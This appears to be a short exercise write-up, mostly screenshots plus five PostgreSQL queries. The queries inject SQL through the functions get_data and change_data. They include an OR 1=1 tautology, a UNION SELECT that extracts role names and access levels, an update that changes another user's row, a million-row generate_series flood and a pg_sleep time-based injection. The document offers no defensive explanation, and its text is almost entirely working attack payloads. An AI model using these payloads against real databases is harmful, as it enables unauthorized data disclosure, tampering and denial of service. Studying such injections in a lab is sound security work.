![image](https://user-images.githubusercontent.com/58373600/207052197-504f2be1-5716-40ad-bbe5-3d0ad460f5f9.png)

`SELECT * FROM get_data('1'' OR 1=1 -- ');`

![image](https://user-images.githubusercontent.com/58373600/207052345-78047523-128d-4f4c-9d39-09d5a42bfadb.png)

`SELECT * FROM get_data('1'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS INTEGER) FROM role_access_level -- ');`

![image](https://user-images.githubusercontent.com/58373600/207052496-6f675c13-f9df-4f8e-9ad1-d110f0cfe84f.png)

`SELECT * FROM change_data('1'' OR role_name = ''sergey'' -- ', 3);`

![image](https://user-images.githubusercontent.com/58373600/207052878-3bbd9a1f-55d5-4928-b648-82c16990feda.png)

`SELECT * FROM get_data('1'' UNION (SELECT a1, CAST(a1 AS VARCHAR), CAST(a1 AS INTEGER) FROM (SELECT generate_series a1 FROM generate_series (1,1000)) t1 CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- ');`

![image](https://user-images.githubusercontent.com/58373600/207053016-3ad3b90e-7b1c-47f0-a0c8-5ee8d09ed72d.png)

`SELECT * FROM get_data('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(30)) --');`

![image](https://user-images.githubusercontent.com/58373600/207053352-9b54181d-f1c2-4f4b-8eb5-c77379eca869.png)
